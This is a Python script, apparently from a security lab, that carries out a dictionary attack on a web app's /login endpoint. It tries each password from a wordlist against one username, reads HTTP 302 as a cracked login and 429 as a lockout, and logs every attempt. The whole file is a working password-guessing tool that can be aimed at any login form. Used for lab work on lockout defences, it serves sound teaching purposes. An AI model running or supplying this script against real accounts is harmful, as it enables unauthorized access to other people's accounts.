"""Dictionary attack: many candidate passwords tried against one account
on the webapp's /login endpoint.

Response signals used to interpret each attempt (matches app.py):
    HTTP 302 -> success (redirected to /dashboard)
    HTTP 429 -> account locked (defense mode only)
    HTTP 200 -> failed login
"""
import argparse
import os
import time

import requests


def try_login(base_url, username, password, timeout=5.0):
    resp = requests.post(
        f"{base_url}/login",
        data={"username": username, "password": password},
        allow_redirects=False,
        timeout=timeout,
    )
    return resp.status_code


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True, help="e.g. http://192.168.56.20:5000")
    parser.add_argument("--user", required=True)
    parser.add_argument("--wordlist", required=True)
    parser.add_argument("--log", default=os.path.join(os.path.dirname(__file__), "logs", "attacker_dict.log"))
    args = parser.parse_args()

    os.makedirs(os.path.dirname(args.log), exist_ok=True)
    logf = open(args.log, "a")

    with open(args.wordlist) as f:
        candidates = [line.strip() for line in f if line.strip()]

    total_start = time.time()
    for i, password in enumerate(candidates, 1):
        request_start = time.time()
        try:
            status = try_login(args.url, args.user, password)
        except requests.RequestException as e:
            status = f"ERROR {e}"
        request_elapsed = time.time() - request_start
        total_elapsed = time.time() - total_start
        line = f"[{request_elapsed:7.3f}s] attempt={i} user={args.user} password={password!r} -> HTTP {status}"
        print(line)
        logf.write(line + "\n")

        if status == 302:
            print(f"\nSUCCESS: {args.user}:{password}  ({i} attempts, {total_elapsed:.2f}s total)")
            logf.write(f"CRACKED user={args.user} password={password} attempts={i} time={total_elapsed:.2f}s\n")
            break
        if status == 429:
            print(f"\nACCOUNT LOCKED after {i} attempts ({total_elapsed:.2f}s total) - dictionary attack blocked")
            logf.write(f"LOCKED_OUT user={args.user} attempts={i} time={total_elapsed:.2f}s\n")
            break
    else:
        print(f"\nExhausted wordlist ({len(candidates)} words), no match.")

    logf.close()


if __name__ == "__main__":
    main()
